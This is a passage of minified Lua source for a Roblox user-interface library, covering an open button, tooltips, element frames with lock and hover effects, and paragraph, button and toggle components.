AnchorPoint=Vector2.new(0.5,0.5),
ThemeTag={
ImageColor3="Icon",
},
ImageTransparency=.3,
})
})
local ak=ac("Frame",{
Size=UDim2.new(0,1,1,0),
Position=UDim2.new(0,36,0.5,0),
AnchorPoint=Vector2.new(0,0.5),
BackgroundColor3=Color3.new(1,1,1),
BackgroundTransparency=.9,
})

local al=ac("Frame",{
Size=UDim2.new(0,0,0,0),
Position=UDim2.new(0.5,0,0,28),
AnchorPoint=Vector2.new(0.5,0.5),
Parent=af.Parent,
BackgroundTransparency=1,
Active=true,
Visible=false,
})


local am=ac("UIScale",{
Scale=1,
})

local an=ac("Frame",{
Size=UDim2.new(0,0,0,44),
AutomaticSize="X",
Parent=al,
Active=false,
BackgroundTransparency=.25,
ZIndex=99,
BackgroundColor3=Color3.new(0,0,0),
},{
am,
ac("UICorner",{
CornerRadius=UDim.new(1,0)
}),
ac("UIStroke",{
Thickness=1,
ApplyStrokeMode="Border",
Color=Color3.new(1,1,1),
Transparency=0,
},{
ac("UIGradient",{
Color=ColorSequence.new(Color3.fromHex"40c9ff",Color3.fromHex"e81cff")
})
}),
aj,
ak,

ac("UIListLayout",{
Padding=UDim.new(0,4),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),

ac("TextButton",{
AutomaticSize="XY",
Active=true,
BackgroundTransparency=1,
Size=UDim2.new(0,0,0,36),

BackgroundColor3=Color3.new(1,1,1),
},{
ac("UICorner",{
CornerRadius=UDim.new(1,-4)
}),
ah,
ac("UIListLayout",{
Padding=UDim.new(0,af.UIPadding),
FillDirection="Horizontal",
VerticalAlignment="Center",
}),
ai,
ac("UIPadding",{
PaddingLeft=UDim.new(0,11),
PaddingRight=UDim.new(0,11),
}),
}),
ac("UIPadding",{
PaddingLeft=UDim.new(0,4),
PaddingRight=UDim.new(0,4),
})
})

ag.Button=an



function ag.SetIcon(ao,ap)
if ah then
ah:Destroy()
end
if ap then
ah=ab.Image(
ap,
af.Title,
0,
af.Folder,
"OpenButton",
true,
af.IconThemed
)
ah.Size=UDim2.new(0,22,0,22)
ah.LayoutOrder=-1
ah.Parent=ag.Button.TextButton
end
end

if af.Icon then
ag:SetIcon(af.Icon)
end



ab.AddSignal(an:GetPropertyChangedSignal"AbsoluteSize",function()
al.Size=UDim2.new(
0,an.AbsoluteSize.X,
0,an.AbsoluteSize.Y
)
end)

ab.AddSignal(an.TextButton.MouseEnter,function()
ad(an.TextButton,.1,{BackgroundTransparency=.93}):Play()
end)
ab.AddSignal(an.TextButton.MouseLeave,function()
ad(an.TextButton,.1,{BackgroundTransparency=1}):Play()
end)

local ao=ab.Drag(al)


function ag.Visible(ap,aq)
al.Visible=aq
end

function ag.SetScale(ap,aq)
am.Scale=aq
end

function ag.Edit(ap,aq)
local ar={
Title=aq.Title,
Icon=aq.Icon,
Enabled=aq.Enabled,
Position=aq.Position,
OnlyIcon=aq.OnlyIcon or false,
Draggable=aq.Draggable or nil,
OnlyMobile=aq.OnlyMobile,
CornerRadius=aq.CornerRadius or UDim.new(1,0),
StrokeThickness=aq.StrokeThickness or 2,
Scale=aq.Scale or 1,
Color=aq.Color
or ColorSequence.new(Color3.fromHex"40c9ff",Color3.fromHex"e81cff"),
}



if ar.Enabled==false then
af.IsOpenButtonEnabled=false
end

if ar.OnlyMobile~=false then
ar.OnlyMobile=true
else
af.IsPC=false
end


if ar.Draggable==false and aj and ak then
aj.Visible=ar.Draggable
ak.Visible=ar.Draggable

if ao then
ao:Set(ar.Draggable)
end
end

if ar.Position and al then
al.Position=ar.Position
end

if ar.OnlyIcon==true and ai then
ai.Visible=false
an.TextButton.UIPadding.PaddingLeft=UDim.new(0,7)
an.TextButton.UIPadding.PaddingRight=UDim.new(0,7)
elseif ar.OnlyIcon==false then
ai.Visible=true
an.TextButton.UIPadding.PaddingLeft=UDim.new(0,11)
an.TextButton.UIPadding.PaddingRight=UDim.new(0,11)
end





if ai then
if ar.Title then
ai.Text=ar.Title
ab:ChangeTranslationKey(ai,ar.Title)
elseif ar.Title==nil then

end
end

if ar.Icon then
ag:SetIcon(ar.Icon)
end

an.UIStroke.UIGradient.Color=ar.Color
if Glow then
Glow.UIGradient.Color=ar.Color
end

an.UICorner.CornerRadius=ar.CornerRadius
an.TextButton.UICorner.CornerRadius=UDim.new(ar.CornerRadius.Scale,ar.CornerRadius.Offset-4)
an.UIStroke.Thickness=ar.StrokeThickness

ag:SetScale(ar.Scale)
end

return ag
end



return aa end function a.B()
local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween


function aa.New(ae,af,ag,ah,ai,aj)
local ak={
Container=nil,
TooltipSize=16,

TooltipArrowSizeX=ai=="Small"and 16 or 24,
TooltipArrowSizeY=ai=="Small"and 6 or 9,

PaddingX=ai=="Small"and 12 or 14,
PaddingY=ai=="Small"and 7 or 9,

Radius=999,

TitleFrame=nil,
}

ah=ah or""
aj=aj~=false

local al=ac("TextLabel",{
AutomaticSize="XY",
TextWrapped=aj,
BackgroundTransparency=1,
FontFace=Font.new(ab.Font,Enum.FontWeight.Medium),
Text=ae,
TextSize=ai=="Small"and 15 or 17,
TextTransparency=1,
ThemeTag={
TextColor3="Tooltip"..ah.."Text",
}
})

ak.TitleFrame=al

local am=ac("UIScale",{
Scale=.9
})

local an=ac("Frame",{
AnchorPoint=Vector2.new(0.5,0),
AutomaticSize="XY",
BackgroundTransparency=1,
Parent=af,

Visible=false
},{
ac("UISizeConstraint",{
MaxSize=Vector2.new(400,math.huge)
}),
ac("Frame",{
AutomaticSize="XY",
BackgroundTransparency=1,
LayoutOrder=99,
Visible=ag,
Name="Arrow",
},{
ac("ImageLabel",{
Size=UDim2.new(0,ak.TooltipArrowSizeX,0,ak.TooltipArrowSizeY),
BackgroundTransparency=1,

Image="rbxassetid://105854070513330",
ThemeTag={
ImageColor3="Tooltip"..ah,
},
},{










}),
}),
ab.NewRoundFrame(ak.Radius,"Squircle",{
AutomaticSize="XY",
ThemeTag={
ImageColor3="Tooltip"..ah,
},
ImageTransparency=1,
Name="Background",
},{



ac("Frame",{



AutomaticSize="XY",
BackgroundTransparency=1,
},{
ac("UICorner",{
CornerRadius=UDim.new(0,16),
}),
ac("UIListLayout",{
Padding=UDim.new(0,12),
FillDirection="Horizontal",
VerticalAlignment="Center"
}),

al,
ac("UIPadding",{
PaddingTop=UDim.new(0,ak.PaddingY),
PaddingLeft=UDim.new(0,ak.PaddingX),
PaddingRight=UDim.new(0,ak.PaddingX),
PaddingBottom=UDim.new(0,ak.PaddingY),
}),
})
}),
am,
ac("UIListLayout",{
Padding=UDim.new(0,0),
FillDirection="Vertical",
VerticalAlignment="Center",
HorizontalAlignment="Center",
}),
})
ak.Container=an

function ak.Open(ao)
an.Visible=true


ad(an.Background,.2,{ImageTransparency=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(an.Arrow.ImageLabel,.2,{ImageTransparency=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(al,.2,{TextTransparency=0},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(am,.22,{Scale=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
end

function ak.Close(ao,ap)

ad(an.Background,.3,{ImageTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(an.Arrow.ImageLabel,.2,{ImageTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(al,.3,{TextTransparency=1},Enum.EasingStyle.Quint,Enum.EasingDirection.Out):Play()
ad(am,.35,{Scale=.9},Enum.EasingStyle.Quint,Enum.EasingDirection.In):Play()

ap=ap~=false
if ap then
task.wait(.35)

an.Visible=false
an:Destroy()
end
end

return ak
end



return aa end function a.C()
game:GetService"ReplicatedStorage"
local aa=a.load'd'
local ab=aa.New
local ac=aa.NewRoundFrame
local ad=aa.Tween

local ae=(cloneref or clonereference or function(ae)
return ae
end)

ae(game:GetService"UserInputService")

local af=a.load'y'

local function Color3ToHSB(ag)
local ah,ai,aj=ag.R,ag.G,ag.B
local ak=math.max(ah,ai,aj)
local al=math.min(ah,ai,aj)
local am=ak-al

local an=0
if am~=0 then
if ak==ah then
an=(ai-aj)/am%6
elseif ak==ai then
an=(aj-ah)/am+2
else
an=(ah-ai)/am+4
end
an=an*60
else
an=0
end

local ao=(ak==0)and 0 or(am/ak)
local ap=ak

return{
h=math.floor(an+0.5),
s=ao,
b=ap,
}
end

local function GetPerceivedBrightness(ag)
local ah=ag.R
local ai=ag.G
local aj=ag.B
return 0.299*ah+0.587*ai+0.114*aj
end

local function GetTextColorForHSB(ag)
local ah=Color3ToHSB(ag)local
ai, aj, ak=ah.h, ah.s, ah.b
if GetPerceivedBrightness(ag)>0.5 then
return Color3.fromHSV(ai/360,0,0.05)
else
return Color3.fromHSV(ai/360,0,0.98)
end
end

return function(ag)
local ah={
Title=ag.Title,
Desc=ag.Desc or nil,
Hover=ag.Hover,
Thumbnail=ag.Thumbnail,
ThumbnailSize=ag.ThumbnailSize or 80,
Image=ag.Image,
IconThemed=ag.IconThemed or false,
ImageSize=ag.ImageSize or 30,
Color=ag.Color,
Scalable=ag.Scalable,
Parent=ag.Parent,
Justify=ag.Justify or"Between",
UIPadding=ag.Window.ElementConfig.UIPadding,
UICorner=ag.Window.ElementConfig.UICorner,
Size=ag.Size or"Default",
Tags=ag.Tags or{},
UIElements={},

Index=ag.Index,
}

local ai=ah.Size=="Small"and-4 or ah.Size=="Large"and 4 or 0
local aj=ah.Size=="Small"and-4 or ah.Size=="Large"and 4 or 0

local ak=ah.ImageSize
local al=ah.ThumbnailSize
local am=true


local an=0

local ao
local ap
if ah.Thumbnail then
ao=aa.Image(
ah.Thumbnail,
ah.Title,
ag.Window.NewElements and ah.UICorner-11 or(ah.UICorner-4),
ag.Window.Folder,
"Thumbnail",
false,
ah.IconThemed
)
ao.Size=UDim2.new(1,0,0,al)
end
if ah.Image then
ap=aa.Image(
ah.Image,
ah.Title,
ag.Window.NewElements and ah.UICorner-11 or(ah.UICorner-4),
ag.Window.Folder,
"Image",
ah.IconThemed,
not ah.Color and true or false,
"ElementIcon"
)

if typeof(ah.Color)=="string"and not string.find(ah.Image,"rbxthumb")then
ap.ImageLabel.ImageColor3=GetTextColorForHSB(Color3.fromHex(aa.Colors[ah.Color]))
elseif typeof(ah.Color)=="Color3"and not string.find(ah.Image,"rbxthumb")then
ap.ImageLabel.ImageColor3=GetTextColorForHSB(ah.Color)
end

ap.Size=UDim2.new(0,ak,0,ak)

an=ak
end

local function CreateText(aq,ar)
local as=typeof(ah.Color)=="string"
and GetTextColorForHSB(Color3.fromHex(aa.Colors[ah.Color]))
or typeof(ah.Color)=="Color3"and GetTextColorForHSB(ah.Color)

return ab("TextLabel",{
BackgroundTransparency=1,
Text=aq or"",
TextSize=ar=="Desc"and 15 or 17,
TextXAlignment="Left",
ThemeTag={
TextColor3=not ah.Color and("Element"..ar)or nil,
},
TextColor3=ah.Color and as or nil,
TextTransparency=ar=="Desc"and 0.3 or 0,
TextWrapped=true,
Size=UDim2.new(ah.Justify=="Between"and 1 or 0,0,0,0),
AutomaticSize=ah.Justify=="Between"and"Y"or"XY",
FontFace=Font.new(aa.Font,ar=="Desc"and Enum.FontWeight.Medium or Enum.FontWeight.SemiBold),
})
end

local aq=CreateText(ah.Title,"Title")
local ar=CreateText(ah.Desc,"Desc")
if not ah.Title or ah.Title==""then
ar.Visible=false
end
if not ah.Desc or ah.Desc==""then
ar.Visible=false
end

ah.UIElements.Title=aq
ah.UIElements.Desc=ar

ah.UIElements.Container=ab("Frame",{
Size=UDim2.new(1,0,1,0),
AutomaticSize="Y",
BackgroundTransparency=1,
},{
ab("UIListLayout",{
Padding=UDim.new(0,ah.UIPadding),
FillDirection="Vertical",
VerticalAlignment="Center",
HorizontalAlignment=ah.Justify=="Between"and"Left"or"Center",
}),
ao,
ab("Frame",{
Size=UDim2.new(
ah.Justify=="Between"and 1 or 0,
ah.Justify=="Between"and-ag.TextOffset or 0,
0,
0
),
AutomaticSize=ah.Justify=="Between"and"Y"or"XY",
BackgroundTransparency=1,
Name="TitleFrame",
},{
ab("UIListLayout",{
Padding=UDim.new(0,ah.UIPadding),
FillDirection="Horizontal",
VerticalAlignment=ag.Window.NewElements and(ah.Justify=="Between"and"Top"or"Center")
or"Center",
HorizontalAlignment=ah.Justify~="Between"and ah.Justify or"Center",
}),
ap,
ab("Frame",{
BackgroundTransparency=1,
AutomaticSize=ah.Justify=="Between"and"Y"or"XY",
Size=UDim2.new(
ah.Justify=="Between"and 1 or 0,
ah.Justify=="Between"and(ap and-an-ah.UIPadding or-an)
or 0,
1,
0
),
Name="TitleFrame",
},{
ab("UIPadding",{
PaddingTop=UDim.new(0,(ag.Window.NewElements and ah.UIPadding/2 or 0)+aj),
PaddingLeft=UDim.new(0,(ag.Window.NewElements and ah.UIPadding/2 or 0)+ai),
PaddingRight=UDim.new(
0,
(ag.Window.NewElements and ah.UIPadding/2 or 0)+ai
),
PaddingBottom=UDim.new(
0,
(ag.Window.NewElements and ah.UIPadding/2 or 0)+aj
),
}),
ab("UIListLayout",{
Padding=UDim.new(0,6),
FillDirection="Vertical",
VerticalAlignment="Center",
HorizontalAlignment="Left",
}),
ab("ScrollingFrame",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
LayoutOrder=-99,
BackgroundTransparency=1,
ScrollingDirection="X",
CanvasSize=UDim2.new(0,0,0,0),
ScrollBarThickness=0,
Visible=false,
},{
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Left",
Padding=UDim.new(0,ag.Window.UIPadding/2),
}),
}),
ab("Frame",{
Name="Space",
Size=UDim2.new(1,0,0,0),
BackgroundTransparency=1,
Visible=false,
}),
aq,
ar,
}),
}),
})

for as,at in next,ag.Tags or{}do
if not ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame.Visible then
ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame.Visible=true
ah.UIElements.Container.TitleFrame.TitleFrame.Space.Visible=true
end
af:New(at,ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame)
end

aa.AddSignal(
ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame.UIListLayout:GetPropertyChangedSignal
"AbsoluteContentSize"
,
function()
ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame.Size=UDim2.new(
1,
0,
0,
ah.UIElements.Container.TitleFrame.TitleFrame.ScrollingFrame.UIListLayout.AbsoluteContentSize.Y
/ag.ParentConfig.UIScale
)
end
)





local as=aa.Image("lock","lock",0,ag.Window.Folder,"Lock",false)
as.Size=UDim2.new(0,20,0,20)
as.ImageLabel.ImageColor3=Color3.new(1,1,1)
as.ImageLabel.ImageTransparency=0.4

local at=ab("TextLabel",{
Text="Locked",
TextSize=18,
FontFace=Font.new(aa.Font,Enum.FontWeight.Medium),
AutomaticSize="XY",
BackgroundTransparency=1,
TextColor3=Color3.new(1,1,1),
TextTransparency=0.05,
})

local au=ab("Frame",{
Size=UDim2.new(1,ah.UIPadding*2,1,ah.UIPadding*2),
BackgroundTransparency=1,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
ZIndex=9999999,
})

local av,aw=ac(ah.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=0.25,
ImageColor3=Color3.new(0,0,0),
Visible=false,
Active=false,
Parent=au,
},{
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Center",
Padding=UDim.new(0,8),
}),
as,
at,
},nil,true)local

ax=ac(ah.UICorner,"Squircle-Outline",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
Active=false,
ThemeTag={
ImageColor3="Text",
},
Parent=au,
},{
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Center",
Padding=UDim.new(0,8),
}),
},nil,true)

local ay,az=ac(ah.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
Active=false,
ThemeTag={
ImageColor3="Text",
},
Parent=au,
},{
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Center",
Padding=UDim.new(0,8),
}),
},nil,true)local

aA=ac(ah.UICorner,"Squircle-Outline",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
Visible=false,
Active=false,
ThemeTag={
ImageColor3="Text",
},
Parent=au,
},{
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Center",
Padding=UDim.new(0,8),
}),
ab("UIGradient",{
Name="HoverGradient",
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(0.5,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(1,Color3.new(1,1,1)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,1),
NumberSequenceKeypoint.new(0.25,0.9),
NumberSequenceKeypoint.new(0.5,0.3),
NumberSequenceKeypoint.new(0.75,0.9),
NumberSequenceKeypoint.new(1,1),
},
}),
},nil,true)

local aB,b=ac(ah.UICorner,"Squircle",{
Size=UDim2.new(1,0,1,0),
ImageTransparency=1,
Active=false,
ThemeTag={
ImageColor3="Text",
},
Parent=au,
},{
ab("UIGradient",{
Name="HoverGradient",
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(0.5,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(1,Color3.new(1,1,1)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,1),
NumberSequenceKeypoint.new(0.25,0.9),
NumberSequenceKeypoint.new(0.5,0.3),
NumberSequenceKeypoint.new(0.75,0.9),
NumberSequenceKeypoint.new(1,1),
},
}),
ab("UIListLayout",{
FillDirection="Horizontal",
VerticalAlignment="Center",
HorizontalAlignment="Center",
Padding=UDim.new(0,8),
}),
},nil,true)

local d,f=ac(ah.UICorner,"Squircle",{
Size=UDim2.new(1,0,0,0),
AutomaticSize="Y",
ImageTransparency=ah.Color and 0.05 or(not ag.Window.NewElements and 0.93 or nil),



Parent=ag.Parent,
ThemeTag={
ImageColor3=not ah.Color and(ag.Window.NewElements and"ElementBackground"or"Text")or nil,
ImageTransparency=not ah.Color
and(ag.Window.NewElements and"ElementBackgroundTransparency"or nil)
or nil,
},
ImageColor3=ah.Color and(typeof(ah.Color)=="string"and Color3.fromHex(
aa.Colors[ah.Color]
)or typeof(ah.Color)=="Color3"and ah.Color)or nil,
},{
ah.UIElements.Container,
au,
ab("UIPadding",{
PaddingTop=UDim.new(0,ah.UIPadding),
PaddingLeft=UDim.new(0,ah.UIPadding),
PaddingRight=UDim.new(0,ah.UIPadding),
PaddingBottom=UDim.new(0,ah.UIPadding),
}),
},true,true)

ah.UIElements.Main=d
ah.UIElements.Locked=av

if ah.Hover then
aa.AddSignal(d.MouseEnter,function()
if am then

ad(aB,0.12,{ImageTransparency=0.9}):Play()
ad(aA,0.12,{ImageTransparency=0.8}):Play()
aa.AddSignal(d.MouseMoved,function(g,h)
aB.HoverGradient.Offset=
Vector2.new(((g-d.AbsolutePosition.X)/d.AbsoluteSize.X)-0.5,0)
aA.HoverGradient.Offset=
Vector2.new(((g-d.AbsolutePosition.X)/d.AbsoluteSize.X)-0.5,0)
end)
end
end)
aa.AddSignal(d.InputEnded,function()
if am then

ad(aB,0.12,{ImageTransparency=1}):Play()
ad(aA,0.12,{ImageTransparency=1}):Play()
end
end)
end

function ah.SetTitle(g,h)
ah.Title=h
aq.Text=h
end

function ah.SetDesc(g,h)
ah.Desc=h
ar.Text=h or""
if not h then
ar.Visible=false
elseif not ar.Visible then
ar.Visible=true
end
end

function ah.Colorize(g,h,i)
if ah.Color then
h[i]=typeof(ah.Color)=="string"
and GetTextColorForHSB(Color3.fromHex(aa.Colors[ah.Color]))
or typeof(ah.Color)=="Color3"and GetTextColorForHSB(ah.Color)
or nil
end
end

if ag.ElementTable then
aa.AddSignal(aq:GetPropertyChangedSignal"Text",function()
if ah.Title~=aq.Text then
ah:SetTitle(aq.Text)
ag.ElementTable.Title=aq.Text
end
end)
aa.AddSignal(ar:GetPropertyChangedSignal"Text",function()
if ah.Desc~=ar.Text then
ah:SetDesc(ar.Text)
ag.ElementTable.Desc=ar.Text
end
end)
end





function ah.SetThumbnail(g,h,i)
ah.Thumbnail=h
if i then
ah.ThumbnailSize=i
al=i
end

if ao then
if h then
ao:Destroy()
ao=aa.Image(
h,
ah.Title,
ah.UICorner-3,
ag.Window.Folder,
"Thumbnail",
false,
ah.IconThemed
)
if ao then
ao.Size=UDim2.new(1,0,0,al)
ao.Parent=ah.UIElements.Container
local l=ah.UIElements.Container:FindFirstChild"UIListLayout"
if l then
ao.LayoutOrder=-1
end
end
else
ao.Visible=false
end
else
if h then
ao=aa.Image(
h,
ah.Title,
ah.UICorner-3,
ag.Window.Folder,
"Thumbnail",
false,
ah.IconThemed
)
if ao then
ao.Size=UDim2.new(1,0,0,al)
ao.Parent=ah.UIElements.Container
local l=ah.UIElements.Container:FindFirstChild"UIListLayout"
if l then
ao.LayoutOrder=-1
end
end
end
end
end

function ah.SetImage(g,h,i)
ah.Image=h
if i then
ah.ImageSize=i
ak=i
end

if h then
local l=ap and ap.Parent or ah.UIElements.Container.TitleFrame
if ap then
ap:Destroy()
end

ap=aa.Image(
h,
h,
ah.UICorner-3,
ag.Window.Folder,
"Image",
not ah.Color and true or false
)
if ap then
if typeof(ah.Color)=="string"and not string.find(ah.Image,"rbxthumb")then
ap.ImageLabel.ImageColor3=
GetTextColorForHSB(Color3.fromHex(aa.Colors[ah.Color]))
elseif typeof(ah.Color)=="Color3"and not string.find(ah.Image,"rbxthumb")then
ap.ImageLabel.ImageColor3=GetTextColorForHSB(ah.Color)
end

ap.Visible=true
ap.Parent=l
ap.LayoutOrder=-99

ap.Size=UDim2.new(0,ak,0,ak)
an=ah.ImageSize+ah.UIPadding
end
else
if ap then
ap.Visible=true
end
an=0
end

ah.UIElements.Container.TitleFrame.TitleFrame.Size=UDim2.new(1,-an,1,0)
end

function ah.Destroy(g)
d:Destroy()
end

function ah.Lock(g,h)
am=false
av.Active=true
av.Visible=true
at.Text=h or"Locked"
end

function ah.Unlock(g)
am=true
av.Active=false
av.Visible=false
end

function ah.Highlight(g)
local h=ab("UIGradient",{
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(0.5,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(1,Color3.new(1,1,1)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,1),
NumberSequenceKeypoint.new(0.1,0.9),
NumberSequenceKeypoint.new(0.5,0.3),
NumberSequenceKeypoint.new(0.9,0.9),
NumberSequenceKeypoint.new(1,1),
},
Rotation=0,
Offset=Vector2.new(-1,0),
Parent=ax,
})

local i=ab("UIGradient",{
Color=ColorSequence.new{
ColorSequenceKeypoint.new(0,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(0.5,Color3.new(1,1,1)),
ColorSequenceKeypoint.new(1,Color3.new(1,1,1)),
},
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,1),
NumberSequenceKeypoint.new(0.15,0.8),
NumberSequenceKeypoint.new(0.5,0.1),
NumberSequenceKeypoint.new(0.85,0.8),
NumberSequenceKeypoint.new(1,1),
},
Rotation=0,
Offset=Vector2.new(-1,0),
Parent=ay,
})

ax.ImageTransparency=0.65
ay.ImageTransparency=0.88

ad(h,0.75,{
Offset=Vector2.new(1,0),
}):Play()

ad(i,0.75,{
Offset=Vector2.new(1,0),
}):Play()

task.spawn(function()
task.wait(0.75)
ax.ImageTransparency=1
ay.ImageTransparency=1
h:Destroy()
i:Destroy()
end)
end

function ah.UpdateShape(g)
if ag.Window.NewElements then
local h=aa:GetElementPosition(
g.Elements,
ah.Index,
ag.ParentConfig.ParentTable.__type=="HStack"or ag.ParentConfig.ParentTable.__type=="Group"
)

if h and d then
f:SetType(h)
aw:SetType(h)
az:SetType(h)

b:SetType(h)

end
end
end





return ah
end end function a.D()

local aa=a.load'd'
local ab=aa.New

local ac={}

local ad=a.load'm'.New

function ac.New(ae,af)
af.Hover=false
af.TextOffset=0
af.ParentConfig=af
af.IsButtons=af.Buttons and#af.Buttons>0 and true or false

local ag={
__type="Paragraph",
Title=af.Title or"Paragraph",
Desc=af.Desc or nil,

Locked=af.Locked or false,
}
local ah=a.load'C'(af)

ag.ParagraphFrame=ah
if af.Buttons and#af.Buttons>0 then
local ai=ab("Frame",{
Size=UDim2.new(1,0,0,38),
BackgroundTransparency=1,
AutomaticSize="Y",
Parent=ah.UIElements.Container,
},{
ab("UIListLayout",{
Padding=UDim.new(0,10),
FillDirection="Vertical",
}),
})

for aj,ak in next,af.Buttons do
local al=ad(
ak.Title,
ak.Icon,
ak.Callback,
ak.Variant or"White",
ai,
nil,
nil,
af.Window.NewElements and 999 or 10
)
al.Size=UDim2.new(1,0,0,38)

end
end

return ag.__type,ag
end

return ac end function a.E()

local aa=a.load'd'local ab=
aa.New

local ac={}

function ac.New(ad,ae)
local af={
__type="Button",
Title=ae.Title or"Button",
Desc=ae.Desc or nil,
Icon=ae.Icon or"mouse-pointer-click",
IconThemed=ae.IconThemed or false,
IconColor=ae.IconColor or nil,
Color=ae.Color,
Justify=ae.Justify or"Between",
IconAlign=ae.IconAlign or"Right",
Locked=ae.Locked or false,
LockedTitle=ae.LockedTitle,
Callback=ae.Callback or function()end,
UIElements={},
}

local ag=true

af.ButtonFrame=a.load'C'{
Title=af.Title,
Desc=af.Desc,
Parent=ae.Parent,




Window=ae.Window,
Color=af.Color,
Justify=af.Justify,
TextOffset=20,
Hover=true,
Scalable=true,
Tab=ae.Tab,
Index=ae.Index,
ElementTable=af,
ParentConfig=ae,
Size=ae.Size,
Tags=ae.Tags,
}














af.UIElements.ButtonIcon=aa.Image(
af.Icon,
af.Icon,
0,
ae.Window.Folder,
"Button",
not(af.Color or af.IconColor)and true or nil,
af.IconThemed
)

if af.IconColor then
af.UIElements.ButtonIcon.ImageLabel.ImageColor3=af.IconColor
end

af.UIElements.ButtonIcon.Size=UDim2.new(0,20,0,20)
af.UIElements.ButtonIcon.Parent=af.Justify=="Between"and af.ButtonFrame.UIElements.Main
or af.ButtonFrame.UIElements.Container.TitleFrame
af.UIElements.ButtonIcon.LayoutOrder=af.IconAlign=="Left"and-99999 or 99999
af.UIElements.ButtonIcon.AnchorPoint=Vector2.new(1,0.5)
af.UIElements.ButtonIcon.Position=UDim2.new(1,0,0.5,0)

af.ButtonFrame:Colorize(af.UIElements.ButtonIcon.ImageLabel,"ImageColor3")

function af.Lock(ah)
af.Locked=true
ag=false
return af.ButtonFrame:Lock(af.LockedTitle)
end
function af.Unlock(ah)
af.Locked=false
ag=true
return af.ButtonFrame:Unlock()
end

if af.Locked then
af:Lock()
end

aa.AddSignal(af.ButtonFrame.UIElements.Main.MouseButton1Click,function()
if ag then
task.spawn(function()
aa.SafeCallback(af.Callback)
end)
end
end)
return af.__type,af
end

return ac end function a.F()

local aa={}

local ab=a.load'd'
local ac=ab.New
local ad=ab.Tween

local ae=game:GetService"UserInputService"

function aa.New(af,ag,ah,ai,aj,ak,al)
local am={
GlassSpritesheet={
Id="rbxassetid://77297718671545",
MirroredId="rbxassetid://92258969882244",
Size=Vector2.new(102,128),
Total=80,
Cols=10,
},
}

function am.GetGlassFrame(an,ao:number):(string,Vector2,Vector2)
local ap=am.GlassSpritesheet
local aq:number

if ao<=0.4 then
aq=math.floor((ao/0.4)*(ap.Total-1))
elseif ao<0.6 then
aq=ap.Total-1
else
aq=math.floor(((ao-0.6)/0.4)*(ap.Total-1))
end

aq=math.clamp(aq,0,ap.Total-1)

local ar=ao>=0.6
if ar then
aq=(ap.Total-1)-aq
end

local as=ar and ap.MirroredId or ap.Id

return as,ap.Size,Vector2.new((aq%ap.Cols)*ap.Size.X,math.floor(aq/ap.Cols)*ap.Size.Y)
end

local an=12
local ao
if ag and ag~=""then
ao=ac("ImageLabel",{
Size=UDim2.new(0,13,0,13),
BackgroundTransparency=1,
AnchorPoint=Vector2.new(0.5,0.5),
Position=UDim2.new(0.5,0,0.5,0),
Image=ab.Icon(ag)[1],
ImageRectOffset=ab.Icon(ag)[2].ImageRectPosition,
ImageRectSize=ab.Icon(ag)[2].ImageRectSize,
ImageTransparency=1,
ImageColor3=Color3.new(0,0,0),
})
end

local ap=ac("Frame",{
Size=UDim2.new(0,2,0,26),
BackgroundTransparency=1,
Parent=ai,
})

local aq=ab.NewRoundFrame(an,"Squircle",{
ImageTransparency=0.85,
ThemeTag={
ImageColor3="Text",
},
Parent=ap,
Size=UDim2.new(0,ak and(52)or(40.8),0,24),
AnchorPoint=Vector2.new(1,0.5),
Position=UDim2.new(0,0,0.5,0),
Name="ToggleFrame",
},{
ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(1,0,1,0),
Name="Layer",
ThemeTag={
ImageColor3="Toggle",
},
ImageTransparency=1,
}),
ab.NewRoundFrame(an,"SquircleOutline",{
Size=UDim2.new(1,0,1,0),
Name="Stroke",
ImageColor3=Color3.new(1,1,1),
ImageTransparency=1,
},{
ac("UIGradient",{
Rotation=90,
Transparency=NumberSequence.new{
NumberSequenceKeypoint.new(0,0),
NumberSequenceKeypoint.new(1,1),
},
}),
}),


ab.NewRoundFrame(an,"Squircle",{
Size=UDim2.new(0,ak and 30 or 20,0,20),
Position=UDim2.new(0,2,0.5,0),
AnchorPoint=Vector2.new(0,0.5),
ImageTransparency=1,
